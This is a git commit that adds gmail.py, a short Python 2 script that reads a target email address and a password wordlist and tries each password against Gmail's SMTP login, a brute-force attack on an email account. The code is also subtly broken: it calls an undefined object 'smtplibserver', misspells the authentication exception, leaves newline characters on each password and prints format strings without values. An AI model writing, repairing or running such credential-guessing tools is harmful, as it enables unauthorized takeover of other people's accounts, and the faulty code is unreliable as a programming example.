b3b1958df806d12468ceeebc735d12927a4cf991
sidhocine09 <sidhocine09@gmail.com>
2016-09-09 14:56:53 +0100

    Create gmail.py

---
+++ gmail.py
@@ -0,0 +1,18 @@
+import smtplib
+smtpserver = smtplib.SMTP("smtp.gmail.com",587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+
+user  = raw_input("enter your email : ")
+passwfile = raw_input("enter the list passwd : ")
+passwfile = open(passwfile,"r")
+
+for password in passwfile:
+         try :
+                smtplibserver.login(user,password)
+                print (" [+] password is fond===> %s")  
+                break;
+         except smtplib.SMTPAuthenticatoinError:
+                print(" [+] password is not fond====> %s")
+
